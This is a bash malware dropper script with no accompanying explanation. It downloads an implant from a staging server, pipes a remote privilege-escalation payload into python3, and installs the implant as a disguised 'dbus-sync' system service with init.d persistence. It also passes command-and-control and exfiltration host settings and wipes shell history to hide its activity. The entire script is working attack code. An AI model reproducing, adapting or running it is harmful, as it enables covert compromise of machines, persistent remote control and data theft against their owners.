#!/bin/bash
STAGING_HOST="${STAGING_HOST:-192.168.1.100}"
C2_HOST="${C2_HOST:-${STAGING_HOST}}"
C2_PORT="${C2_PORT:-443}"
EXFIL_HOST="${EXFIL_HOST:-${C2_HOST}}"
EXFIL_PORT="${EXFIL_PORT:-9443}"

IMPLANT="/usr/bin/dbus-sync"
INITD="/etc/init.d/dbus-sync"
WORK="${HOME}/.cache/.sysd"

mkdir -p "${WORK}"

# Stage 2: download implant binary
curl -sLk --max-time 60 -o "${WORK}/.dbus-daemon" "https://${STAGING_HOST}:8443/b"
chmod +x "${WORK}/.dbus-daemon"

# Privesc
curl -sLk --max-time 60 "https://${STAGING_HOST}:8443/priv" | python3 >/dev/null 2>&1 || true
sleep 2

if echo "exit 0" | su >/dev/null 2>&1; then
    # Root gained - install to system path + init.d persistence
    curl -sLk --max-time 30 -o /tmp/.initd "https://${STAGING_HOST}:8443/initd"
    sed -i 's/\r//' /tmp/.initd
    # Inject C2 env vars after shebang so they're exported on start
    { head -1 /tmp/.initd; printf 'export C2_HOST="%s"\nexport C2_PORT="%s"\nexport EXFIL_HOST="%s"\nexport EXFIL_PORT="%s"\n' "${C2_HOST}" "${C2_PORT}" "${EXFIL_HOST}" "${EXFIL_PORT}"; tail -n +2 /tmp/.initd; } > /tmp/.initd2 && mv /tmp/.initd2 /tmp/.initd

    cat > /tmp/.s << EOF
#!/bin/sh
cp "${WORK}/.dbus-daemon" "${IMPLANT}" && chmod 755 "${IMPLANT}" && chown root:root "${IMPLANT}"
cp /tmp/.initd "${INITD}" && chmod 755 "${INITD}" && chown root:root "${INITD}"
ln -sf "${INITD}" /etc/rc2.d/S20dbus-sync
ln -sf "${INITD}" /etc/rc3.d/S20dbus-sync
ln -sf "${INITD}" /etc/rc4.d/S20dbus-sync
ln -sf "${INITD}" /etc/rc5.d/S20dbus-sync
rm -f /tmp/.initd
setsid env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" "${IMPLANT}" >/dev/null 2>&1 &
EOF
    chmod +x /tmp/.s
    echo '/tmp/.s' | su >/dev/null 2>&1
    rm -f /tmp/.s
else
    # No root - run as current user, no persistence
    nohup env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" \
        EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" \
        "${WORK}/.dbus-daemon" >/dev/null 2>&1 &
    disown $!
fi

history -c 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null
